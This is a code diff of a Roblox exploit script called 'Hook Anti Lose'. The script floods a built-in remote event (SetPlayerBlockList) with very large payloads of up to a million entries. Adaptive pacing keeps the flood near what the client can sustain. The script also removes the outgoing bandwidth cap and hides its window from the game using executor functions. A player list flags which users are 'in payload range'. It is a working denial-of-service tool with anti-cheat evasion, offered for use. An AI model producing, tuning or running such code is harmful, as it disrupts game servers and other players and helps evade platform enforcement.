@@ -1,75 +1,152 @@
+--!nonstrict
+-- ═══════════════════ CONFIG ═══════════════════
+local CONFIG = {
+    hideFromGame = true,
+    capOutgoing  = false,
+    autoStart    = false,
+    panelOpen    = false,
+}
+-- ══════════════════════════════════════════════
+
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
-local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
 
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
 local COLORS = {
     bg = Color3.fromRGB(14, 14, 16),
-    surface = Color3.fromRGB(22, 22, 26),
     disabled = Color3.fromRGB(38, 38, 44),
-    border = Color3.fromRGB(60, 60, 68),
     accent = Color3.fromRGB(230, 35, 35),
-    accentDark = Color3.fromRGB(170, 22, 22),
     accentBright = Color3.fromRGB(255, 70, 70),
     crimson = Color3.fromRGB(110, 15, 15),
     text = Color3.fromRGB(238, 238, 242),
     white = Color3.fromRGB(255, 255, 255),
     black = Color3.fromRGB(0, 0, 0),
+    dim = Color3.fromRGB(120, 120, 128),
+    good = Color3.fromRGB(85, 200, 115),
 }
 
 local FONT = Enum.Font.GothamBlack
 
 local SRC = [==[
 local RunService = game:GetService("RunService")
+local Stats = game:GetService("Stats")
 
+-- ═══════════ YOUR METHOD ═══════════
 local Children       = 150000
 local NestedPerChild = 0
 local FieldsPerChild = 0
-local FireBurst      = 1
+local FireBurst      = 1.5
 local FrameDelay     = 0.125
 local FieldSize      = 0
 local RebuildEach    = false
+local Format         = "pair"   -- pair | compact | flat
+-- ═══════════════════════════════════
 
-local state = {
-    running = false,
-    thread  = nil,
-    remote  = nil,
-    cache   = nil,
-    pad     = "",
+-- ═══════════ PACING ═══════════
+local StartInterval  = 2.5
+local MinInterval    = 0.30
+local MaxInterval    = 15.0
+local BackoffFactor  = 1.45
+local SpeedupFactor  = 0.88
+local SpeedupAfter   = 4
+local PanicMB        = 250
+local StartDelay     = 0.10
+local BuildYieldEvery = 100000
+local CapOutgoing    = false
+-- ══════════════════════════════
+
+-- rough serialized bytes per entry, used only for the readout
+local BYTES_PER_ENTRY = { pair = 15, compact = 13, flat = 9 }
+
+local RemoteCandidates = {
+    { "RobloxReplicatedStorage", "SetPlayerBlockList" },
+    { "ReplicatedStorage",       "SetPlayerBlockList" },
 }
 
+local state = {
+    running = false, thread = nil, remote = nil, cache = nil,
+    ms = 0, passes = 0, errors = 0, mem = 0, base = nil, queued = 0,
+    payloadMb = 1, reason = "", interval = StartInterval, children = 0,
+    samples = {},
+}
+
+local function getMem()
+    local ok, mb = pcall(function() return Stats:GetTotalMemoryUsageMb() end)
+    if ok and type(mb) == "number" then return mb end
+    local ok2, mb2 = pcall(function() return Stats:GetMemoryUsageMb() end)
+    if ok2 and type(mb2) == "number" then return mb2 end
+    return nil
+end
+
+local function pushSample(m)
+    local s = state.samples
+    s[#s + 1] = m
+    while #s > 10 do table.remove(s, 1) end
+    local lo = math.huge
+    for _, v in ipairs(s) do if v < lo then lo = v end end
+    if lo < math.huge then state.base = lo end
+end
+
 local function resolve()
-    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
-    if not rrs then return nil end
-    local r = rrs:FindFirstChild("SetPlayerBlockList")
-    if r and (r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent")) then
-        return r
+    for _, path in ipairs(RemoteCandidates) do
+        local node, ok = game, true
+        for i = 1, #path do
+            local nxt = node:FindFirstChild(path[i])
+            if not nxt then ok = false; break end
+            node = nxt
+        end
+        if ok and node and (node:IsA("RemoteEvent") or node:IsA("UnreliableRemoteEvent")) then
+            return node
+        end
     end
     return nil
 end
 
-state.remote = resolve()
+local function estimatePayloadMb()
+    return math.max(Children * (BYTES_PER_ENTRY[Format] or 15) / 1000000, 0.05)
+end
 
-pcall(function()
-    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
-end)
+if CapOutgoing then
+    pcall(function()
+        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+    end)
+end
 
-state.pad = FieldSize > 0 and string.rep("P", FieldSize) or ""
+local function build(yieldAllowed)
+    local n = Children
+    local root = table.create(n)
 
-local function build()
-    local root = table.create(Children)
-    for i = 1, Children do
+    if Format == "flat" then
+        for i = 1, n do
+            root[i] = i
+            if yieldAllowed and (i % BuildYieldEvery == 0) then task.wait() end
+        end
+        return root
+    end
+
+    if Format == "compact" then
+        for i = 1, n do
+            root[i] = { i, i * 2 }
+            if yieldAllowed and (i % BuildYieldEvery == 0) then task.wait() end
+        end
+        return root
+    end
+
+    local pad = FieldSize > 0 and string.rep("P", FieldSize) or ""
+    for i = 1, n do
         local entry = { id = i, v = i * 2 }
         for k = 1, FieldsPerChild do
-            entry["k" .. k] = (FieldSize > 0) and state.pad or (i + k)
+            entry["k" .. k] = (FieldSize > 0) and pad or (i + k)
         end
         for j = 1, NestedPerChild do
             entry["n" .. j] = { a = i, b = j }
         end
         root[i] = entry
+        if yieldAllowed and (i % BuildYieldEvery == 0) then task.wait() end
     end
     return root
 end
@@ -79,29 +156,118 @@ local function fire()
         state.remote = resolve()
         if not state.remote then return end
     end
-    local payload
-    if RebuildEach or not state.cache then
-        payload = build()
+    local payload = state.cache
+    if RebuildEach or not payload then
+        payload = build(false)
         if not RebuildEach then state.cache = payload end
-    else
-        payload = state.cache
     end
     for _ = 1, FireBurst do
         state.remote:FireServer(payload)
     end
 end
 
+local function rebuild()
+    state.cache = build(true)
+    state.children = Children
+    state.payloadMb = estimatePayloadMb()
+    state.samples = {}
+    state.interval = StartInterval
+end
+
 local function start()
     if state.running then return end
     state.running = true
-    state.cache = nil
+    state.errors, state.reason = 0, ""
+
     state.thread = task.spawn(function()
-        while state.running do
+        if StartDelay > 0 then task.wait(StartDelay) end
+
+        rebuild()
+        task.wait(0.4)
+
+        local m0 = getMem()
+        if m0 then pushSample(m0) end
+
+        -- calibration send, then measure the real weight of one payload
+        if not state.remote then state.remote = resolve() end
+        if state.remote and m0 then
+            local c0 = os.clock()
             pcall(fire)
-            if FrameDelay > 0 then
-                task.wait(FrameDelay)
+            task.wait(0.3)
+            local peak = getMem()
+            if peak and peak > m0 then
+                state.payloadMb = math.max(peak - m0, estimatePayloadMb())
+            end
+            task.wait(math.max(0, StartInterval - (os.clock() - c0)))
+            local f = getMem()
+            if f then pushSample(f) end
+        end
+
+        local interval = StartInterval
+        local good = 0
+
+        while state.running do
+            if not state.remote then
+                state.remote = resolve()
+                if not state.remote then task.wait(0.25); continue end
+            end
+
+            -- current backlog estimate
+            local m = getMem()
+            local queued = 0
+            if m and state.base then
+                queued = math.max(m - state.base, 0)
+                state.queued = queued
+            end
+
+            -- AIMD: hold roughly one payload of backlog
+            local hi = state.payloadMb * 2.5
+            local lo = state.payloadMb * 1.2
+
+            if queued > PanicMB then
+                interval = MaxInterval
+                good = 0
+                state.reason = "panic backoff"
+            elseif queued > hi then
+                interval = math.min(interval * BackoffFactor, MaxInterval)
+                good = 0
+                state.reason = "backing off"
+            elseif queued < lo then
+                good += 1
+                if good >= SpeedupAfter then
+                    good = 0
+                    interval = math.max(interval * SpeedupFactor, MinInterval)
+                end
+                if interval <= MinInterval then state.reason = "at floor" end
             else
-                RunService.Heartbeat:Wait()
+                state.reason = ""
+            end
+
+            local f0 = os.clock()
+            local ok = pcall(fire)
+            local cost = os.clock() - f0
+            state.ms = cost * 1000
+            state.interval = interval
+
+            if ok then
+                state.passes += 1
+                state.errors = 0
+            else
+                state.errors += 1
+            end
+
+            if state.errors > 30 then
+                state.running = false
+                state.reason = "remote errors"
+                break
+            end
+
+            task.wait(math.max(0.05, interval - cost))
+
+            local m2 = getMem()
+            if m2 then
+                state.mem = m2
+                pushSample(m2)
             end
         end
     end)
@@ -110,8 +276,22 @@ end
 local function stop()
     state.running = false
     if state.thread then pcall(task.cancel, state.thread) end
-    state.thread = nil
+    state.thread, state.cache = nil, nil
+    state.ms, state.queued = 0, 0
+end
+
+local function setChildren(n)
+    Children = math.max(1000, math.floor(n))
     state.cache = nil
+    state.children = Children
+    state.payloadMb = estimatePayloadMb()
+end
+
+local function setFormat(f)
+    if f ~= "pair" and f ~= "compact" and f ~= "flat" then return end
+    Format = f
+    state.cache = nil
+    state.payloadMb = estimatePayloadMb()
 end
 
 return {
@@ -119,39 +299,59 @@ return {
     stop   = stop,
     toggle = function() if state.running then stop() else start() end end,
     isRunning = function() return state.running end,
+    setChildren = setChildren,
+    children = function() return Children end,
+    setFormat = setFormat,
+    format = function() return Format end,
+    stats = function()
+        return state.ms, state.passes, state.mem, Children, state.queued,
+               state.reason, state.payloadMb, state.interval
+    end,
 }
 ]==]
 
-local loader = coroutine.create(function()
-    local chunk = loadstring(SRC)
-    if not chunk then return end
-    local ok, api = pcall(chunk)
-    if ok and type(api) == "table" then
-        _G.__ALT = api
+-- ═══ SAFE COMPILE ═══
+local compile = loadstring or load
+local api
+do
+    local ok, res = pcall(function() return compile(SRC)() end)
+    if ok and type(res) == "table" and res.start then
+        api = res
+    else
+        warn("[AntiLose] core failed:", res)
     end
-end)
+end
 
-coroutine.resume(loader)
-loader = nil
-
-local api = _G.__ALT
-_G.__ALT = nil
+-- ═══ CONTAINER ═══
+local container = playerGui
+if CONFIG.hideFromGame then
+    local ok, hui = pcall(function()
+        if type(gethui) == "function" then return gethui() end
+    end)
+    if ok and hui then container = hui end
+end
 
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "AntiLoseUI"
 screenGui.ResetOnSpawn = false
 screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 screenGui.IgnoreGuiInset = true
-screenGui.Parent = playerGui
+screenGui.DisplayOrder = 999
+screenGui.Parent = container
+if not screenGui.Parent then screenGui.Parent = playerGui end
 
+if type(getgenv) == "function" then
+    local syn = getgenv().syn
+    if syn and syn.protect_gui then pcall(syn.protect_gui, screenGui) end
+end
+
+-- ═══ WINDOW ═══
 local main = Instance.new("Frame")
-main.Name = "MainFrame"
-main.Size = UDim2.new(0, 210, 0, 92)
+main.Size = UDim2.new(0, 232, 0, 104)
 main.Position = UDim2.new(0.5, 0, 0.5, 0)
 main.AnchorPoint = Vector2.new(0.5, 0.5)
 main.BackgroundColor3 = COLORS.bg
 main.BorderSizePixel = 0
-main.ClipsDescendants = false
 main.Parent = screenGui
 
 local mainCorner = Instance.new("UICorner")
@@ -164,11 +364,10 @@ mainGrad.Rotation = 135
 mainGrad.Parent = main
 
 local borderFrame = Instance.new("Frame")
-borderFrame.Name = "BorderFrame"
 borderFrame.Size = UDim2.new(1, 2, 1, 2)
 borderFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
 borderFrame.AnchorPoint = Vector2.new(0.5, 0.5)
-borderFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+borderFrame.BackgroundColor3 = COLORS.white
 borderFrame.BorderSizePixel = 0
 borderFrame.ZIndex = 0
 borderFrame.Parent = main
@@ -185,11 +384,9 @@ borderGrad.Color = ColorSequence.new({
     ColorSequenceKeypoint.new(0.75, Color3.fromRGB(180, 20, 20)),
     ColorSequenceKeypoint.new(1.0, Color3.fromRGB(40, 5, 5)),
 })
-borderGrad.Rotation = 0
 borderGrad.Parent = borderFrame
 
 local innerMask = Instance.new("Frame")
-innerMask.Name = "InnerMask"
 innerMask.Size = UDim2.new(1, -2, 1, -2)
 innerMask.Position = UDim2.new(0.5, 0, 0.5, 0)
 innerMask.AnchorPoint = Vector2.new(0.5, 0.5)
@@ -208,25 +405,49 @@ innerGrad.Rotation = 135
 innerGrad.Parent = innerMask
 
 local title = Instance.new("TextLabel")
-title.Name = "Title"
-title.Size = UDim2.new(1, 0, 0, 34)
-title.Position = UDim2.new(0, 0, 0, 0)
+title.Size = UDim2.new(1, -136, 0, 24)
+title.Position = UDim2.new(0, 12, 0, 6)
 title.BackgroundTransparency = 1
 title.Font = FONT
 title.Text = "Hook Anti Lose"
 title.TextColor3 = COLORS.text
-title.TextSize = 14
-title.TextXAlignment = Enum.TextXAlignment.Center
+title.TextSize = 11
+title.TextXAlignment = Enum.TextXAlignment.Left
 title.ZIndex = 3
 title.Parent = main
 
+local function mkBtn(text, xoff)
+    local b = Instance.new("TextButton")
+    b.Size = UDim2.new(0, 36, 0, 18)
+    b.Position = UDim2.new(1, xoff, 0, 7)
+    b.BackgroundColor3 = COLORS.disabled
+    b.BorderSizePixel = 0
+    b.Font = FONT
+    b.Text = text
+    b.TextColor3 = COLORS.text
+    b.TextSize = 9
+    b.AutoButtonColor = false
+    b.ZIndex = 4
+    b.Parent = main
+    local c = Instance.new("UICorner")
+    c.CornerRadius = UDim.new(0, 5)
+    c.Parent = b
+    local s = Instance.new("UIStroke")
+    s.Color = COLORS.crimson
+    s.Thickness = 1
+    s.Parent = b
+    return b
+end
+
+local sizeBtn = mkBtn("150k", -124)
+local fmtBtn = mkBtn("PAIR", -84)
+local listBtn = mkBtn("LIST", -44)
+
 local toggle = Instance.new("TextButton")
-toggle.Name = "Toggle"
 toggle.Size = UDim2.new(1, -20, 0, 38)
-toggle.Position = UDim2.new(0, 10, 0, 44)
+toggle.Position = UDim2.new(0, 10, 0, 34)
 toggle.BackgroundColor3 = COLORS.disabled
 toggle.BorderSizePixel = 0
-toggle.Font = FONT
 toggle.Text = ""
 toggle.TextTransparency = 1
 toggle.AutoButtonColor = false
@@ -245,46 +466,183 @@ toggleGrad.Parent = toggle
 local toggleStroke = Instance.new("UIStroke")
 toggleStroke.Color = COLORS.crimson
 toggleStroke.Thickness = 1.66
-toggleStroke.Transparency = 0
 toggleStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
 toggleStroke.Parent = toggle
 
 local toggleLabel = Instance.new("TextLabel")
-toggleLabel.Name = "Label"
 toggleLabel.Size = UDim2.new(1, 0, 1, 0)
-toggleLabel.Position = UDim2.new(0, 0, 0, 0)
 toggleLabel.BackgroundTransparency = 1
 toggleLabel.Font = FONT
 toggleLabel.Text = "DISABLED"
 toggleLabel.TextColor3 = COLORS.white
-toggleLabel.TextTransparency = 0
 toggleLabel.TextSize = 14
-toggleLabel.TextXAlignment = Enum.TextXAlignment.Center
-toggleLabel.TextYAlignment = Enum.TextYAlignment.Center
 toggleLabel.ZIndex = 5
-toggleLabel.Active = false
 toggleLabel.Parent = toggle
 
+local status = Instance.new("TextLabel")
+status.Size = UDim2.new(1, -20, 0, 14)
+status.Position = UDim2.new(0, 10, 0, 78)
+status.BackgroundTransparency = 1
+status.Font = FONT
+status.Text = "idle"
+status.TextColor3 = COLORS.dim
+status.TextSize = 10
+status.ZIndex = 3
+status.Parent = main
+
+-- ═══ PLAYER PANEL ═══
+local panel = Instance.new("Frame")
+panel.Size = UDim2.new(1, 0, 0, 158)
+panel.Position = UDim2.new(0.5, 0, 1, 4)
+panel.AnchorPoint = Vector2.new(0.5, 0)
+panel.BackgroundColor3 = COLORS.bg
+panel.BorderSizePixel = 0
+panel.Visible = false
+panel.ZIndex = 2
+panel.Parent = main
+
+local panelCorner = Instance.new("UICorner")
+panelCorner.CornerRadius = UDim.new(0, 10)
+panelCorner.Parent = panel
+
+local panelStroke = Instance.new("UIStroke")
+panelStroke.Color = COLORS.crimson
+panelStroke.Thickness = 1
+panelStroke.Transparency = 0.25
+panelStroke.Parent = panel
+
+local panelTitle = Instance.new("TextLabel")
+panelTitle.Size = UDim2.new(1, -24, 0, 20)
+panelTitle.Position = UDim2.new(0, 12, 0, 7)
+panelTitle.BackgroundTransparency = 1
+panelTitle.Font = FONT
+panelTitle.Text = "PLAYERS  0"
+panelTitle.TextColor3 = COLORS.text
+panelTitle.TextSize = 11
+panelTitle.TextXAlignment = Enum.TextXAlignment.Left
+panelTitle.ZIndex = 4
+panelTitle.Parent = panel
+
+local scroll = Instance.new("ScrollingFrame")
+scroll.Size = UDim2.new(1, -16, 1, -38)
+scroll.Position = UDim2.new(0, 8, 0, 32)
+scroll.BackgroundTransparency = 1
+scroll.BorderSizePixel = 0
+scroll.ScrollBarThickness = 3
+scroll.ScrollBarImageColor3 = COLORS.crimson
+scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
+scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
+scroll.ZIndex = 3
+scroll.Parent = panel
+
+local layout = Instance.new("UIListLayout")
+layout.Padding = UDim.new(0, 2)
+layout.SortOrder = Enum.SortOrder.LayoutOrder
+layout.Parent = scroll
+
+local rows = {}
+
+local function createRow()
+    local row = Instance.new("Frame")
+    row.Size = UDim2.new(1, -6, 0, 18)
+    row.BackgroundTransparency = 1
+    row.ZIndex = 4
+    row.Parent = scroll
+
+    local dot = Instance.new("Frame")
+    dot.Size = UDim2.new(0, 6, 0, 6)
+    dot.Position = UDim2.new(0, 0, 0.5, -3)
+    dot.BackgroundColor3 = COLORS.dim
+    dot.BorderSizePixel = 0
+    dot.ZIndex = 5
+    dot.Parent = row
+    local dc = Instance.new("UICorner")
+    dc.CornerRadius = UDim.new(1, 0)
+    dc.Parent = dot
+
+    local name = Instance.new("TextLabel")
+    name.Size = UDim2.new(1, -76, 1, 0)
+    name.Position = UDim2.new(0, 12, 0, 0)
+    name.BackgroundTransparency = 1
+    name.Font = FONT
+    name.TextSize = 10
+    name.TextColor3 = COLORS.text
+    name.TextXAlignment = Enum.TextXAlignment.Left
+    name.TextTruncate = Enum.TextTruncate.AtEnd
+    name.ZIndex = 5
+    name.Parent = row
+
+    local uid = Instance.new("TextLabel")
+    uid.Size = UDim2.new(0, 62, 1, 0)
+    uid.Position = UDim2.new(1, -62, 0, 0)
+    uid.BackgroundTransparency = 1
+    uid.Font = FONT
+    uid.TextSize = 9
+    uid.TextColor3 = COLORS.dim
+    uid.TextXAlignment = Enum.TextXAlignment.Right
+    uid.ZIndex = 5
+    uid.Parent = row
+
+    return { row = row, dot = dot, name = name, uid = uid }
+end
+
+local function refreshPlayers()
+    local list = {}
+    for _, p in ipairs(Players:GetPlayers()) do
+        list[#list + 1] = p
+    end
+    table.sort(list, function(a, b)
+        if a == player then return true end
+        if b == player then return false end
+        return a.Name:lower() < b.Name:lower()
+    end)
+
+    local children = api and api.children and api.children() or 0
+    local seen, hit = {}, 0
+
+    for i, p in ipairs(list) do
+        seen[p] = true
+        local r = rows[p]
+        if not r then
+            r = createRow()
+            rows[p] = r
+        end
+        r.row.LayoutOrder = i
+
+        local isSelf = (p == player)
+        local inRange = isSelf or (p.UserId <= children)
+        if inRange and not isSelf then hit += 1 end
+
+        r.name.Text = (p.DisplayName ~= p.Name and p.DisplayName or p.Name) .. (isSelf and "  (you)" or "")
+        r.uid.Text = "#" .. tostring(p.UserId)
+        r.dot.BackgroundColor3 = isSelf and COLORS.accentBright
+            or (inRange and COLORS.good or COLORS.dim)
+        r.name.TextColor3 = inRange and COLORS.text or COLORS.dim
+    end
+
+    for p, r in pairs(rows) do
+        if not seen[p] then
+            r.row:Destroy()
+            rows[p] = nil
+        end
+    end
+
+    panelTitle.Text = string.format("PLAYERS  %d   in payload range  %d", #list, hit)
+end
+
+-- ═══ CONTROLS ═══
 local active = false
 
-RunService.RenderStepped:Connect(function(dt)
-    local speed = active and 160 or 60
-    borderGrad.Rotation = (borderGrad.Rotation + speed * dt) % 360
-end)
-
-local function setActive(state)
-    active = state
-
-    if state then
+local function setActive(on)
+    active = on
+    if on then
         toggle.BackgroundColor3 = COLORS.accentBright
         toggleGrad.Color = ColorSequence.new(COLORS.accent, COLORS.accentBright)
         toggleGrad.Rotation = 0
         toggleStroke.Color = COLORS.accentBright
         toggleLabel.Text = "ENABLED"
         toggleLabel.TextColor3 = COLORS.black
-        if api and api.start then
-            pcall(api.start)
-        end
+        if api then pcall(api.start) end
     else
         toggle.BackgroundColor3 = COLORS.disabled
         toggleGrad.Color = ColorSequence.new(COLORS.disabled, Color3.fromRGB(48, 48, 54))
@@ -292,39 +650,168 @@ local function setActive(state)
         toggleStroke.Color = COLORS.crimson
         toggleLabel.Text = "DISABLED"
         toggleLabel.TextColor3 = COLORS.white
-        if api and api.stop then
-            pcall(api.stop)
-        end
+        if api then pcall(api.stop) end
     end
 end
 
-toggle.MouseButton1Click:Connect(function()
-    setActive(not active)
+toggle.MouseButton1Click:Connect(function() setActive(not active) end)
+
+local function restartIfRunning()
+    if active then
+        if api then pcall(api.stop) end
+        task.delay(0.3, function()
+            if active and api then pcall(api.start) end
+        end)
+    end
+end
+
+local SIZES = { 25000, 50000, 100000, 150000, 250000, 400000, 600000, 1000000 }
+local SIZELBL = {
+    [25000] = "25k", [50000] = "50k", [100000] = "100k", [150000] = "150k",
+    [250000] = "250k", [400000] = "400k", [600000] = "600k", [1000000] = "1M",
+}
+local sizeIdx = 4
+
+local FORMATS = { "pair", "compact", "flat" }
+local FMTLBL = { pair = "PAIR", compact = "CMPCT", flat = "FLAT" }
+local fmtIdx = 1
+
+local function saveCfg()
+    if type(writefile) ~= "function" then return end
+    pcall(writefile, "antilose_cfg.txt", SIZES[sizeIdx] .. "," .. FORMATS[fmtIdx])
+end
+
+local function loadCfg()
+    if type(readfile) ~= "function" then return end
+    local ok, s = pcall(readfile, "antilose_cfg.txt")
+    if not ok or type(s) ~= "string" then return end
+    local a, b = s:match("(%d+),(%a+)")
+    if a then
+        for i, v in ipairs(SIZES) do if v == tonumber(a) then sizeIdx = i end end
+    end
+    if b then
+        for i, v in ipairs(FORMATS) do if v == b then fmtIdx = i end end
+    end
+end
+
+sizeBtn.MouseButton1Click:Connect(function()
+    sizeIdx = (sizeIdx % #SIZES) + 1
+    local n = SIZES[sizeIdx]
+    if api and api.setChildren then pcall(api.setChildren, n) end
+    sizeBtn.Text = SIZELBL[n]
+    saveCfg()
+    restartIfRunning()
 end)
 
-local dragging = false
-local dragStart, startPos
+fmtBtn.MouseButton1Click:Connect(function()
+    fmtIdx = (fmtIdx % #FORMATS) + 1
+    local f = FORMATS[fmtIdx]
+    if api and api.setFormat then pcall(api.setFormat, f) end
+    fmtBtn.Text = FMTLBL[f]
+    fmtBtn.TextColor3 = (f == "pair") and COLORS.text or COLORS.accentBright
+    saveCfg()
+    restartIfRunning()
+end)
+
+listBtn.MouseButton1Click:Connect(function()
+    panel.Visible = not panel.Visible
+    listBtn.Text = panel.Visible and "HIDE" or "LIST"
+    if panel.Visible then refreshPlayers() end
+end)
+
+-- ═══ DRAG ═══
+local dragging, dragStart, startPos = false, nil, nil
+
+local function inRect(p, obj)
+    local r, s = obj.AbsolutePosition, obj.AbsoluteSize
+    return p.X >= r.X and p.X <= r.X + s.X and p.Y >= r.Y and p.Y <= r.Y + s.Y
+end
 
 main.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        dragging = true
-        dragStart = input.Position
-        startPos = main.Position
-    end
+    if input.UserInputType ~= Enum.UserInputType.MouseButton1
+    and input.UserInputType ~= Enum.UserInputType.Touch then return end
+    if inRect(input.Position, toggle) or inRect(input.Position, sizeBtn)
+    or inRect(input.Position, listBtn) or inRect(input.Position, fmtBtn) then return end
+    dragging = true
+    dragStart = input.Position
+    startPos = main.Position
 end)
 
 UserInputService.InputChanged:Connect(function(input)
-    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
-        local delta = input.Position - dragStart
-        main.Position = UDim2.new(
-            startPos.X.Scale, startPos.X.Offset + delta.X,
-            startPos.Y.Scale, startPos.Y.Offset + delta.Y
-        )
-    end
+    if not dragging then return end
+    if input.UserInputType ~= Enum.UserInputType.MouseMovement
+    and input.UserInputType ~= Enum.UserInputType.Touch then return end
+    local d = input.Position - dragStart
+    main.Position = UDim2.new(
+        startPos.X.Scale, startPos.X.Offset + d.X,
+        startPos.Y.Scale, startPos.Y.Offset + d.Y
+    )
 end)
 
 UserInputService.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+    if input.UserInputType == Enum.UserInputType.MouseButton1
+    or input.UserInputType == Enum.UserInputType.Touch then
         dragging = false
     end
 end)
+
+UserInputService.InputBegan:Connect(function(input, processed)
+    if processed then return end
+    if input.KeyCode == Enum.KeyCode.End and active then setActive(false) end
+end)
+
+-- ═══ READOUT ═══
+local lastPasses, lastT, acc, pacc = 0, os.clock(), 0, 0
+
+RunService.RenderStepped:Connect(function(dt)
+    borderGrad.Rotation = (borderGrad.Rotation + (active and 160 or 60) * dt) % 360
+
+    acc += dt
+    if acc < 0.3 then return end
+    acc = 0
+
+    if not api then
+        status.Text = "core failed - check console"
+        status.TextColor3 = COLORS.accentBright
+        return
+    end
+
+    if not active then
+        status.Text = "idle  |  " .. sizeBtn.Text .. "  |  " .. fmtBtn.Text
+        status.TextColor3 = COLORS.dim
+        lastPasses, lastT = 0, os.clock()
+    else
+        local ms, passes, mem, children, queued, reason, payloadMb, interval = api.stats()
+        local now = os.clock()
+        local rate = (passes - lastPasses) / math.max(now - lastT, 1e-3)
+        lastPasses, lastT = passes, now
+
+        status.Text = string.format("%.1fs | %.1f MB | q %.0f MB | %.2f/s",
+            interval or 0, payloadMb or 0, queued or 0, rate)
+
+        if (queued or 0) > 200 then
+            status.TextColor3 = COLORS.accentBright
+        elseif reason ~= "" and reason ~= "at floor" then
+            status.TextColor3 = COLORS.accent
+        else
+            status.TextColor3 = COLORS.dim
+        end
+    end
+
+    pacc += 0.3
+    if panel.Visible and pacc >= 0.6 then
+        pacc = 0
+        refreshPlayers()
+    end
+end)
+
+loadCfg()
+sizeBtn.Text = SIZELBL[SIZES[sizeIdx]]
+fmtBtn.Text = FMTLBL[FORMATS[fmtIdx]]
+if CONFIG.panelOpen then
+    panel.Visible = true
+    listBtn.Text = "HIDE"
+end
+
+refreshPlayers()
+if CONFIG.autoStart then setActive(true) end
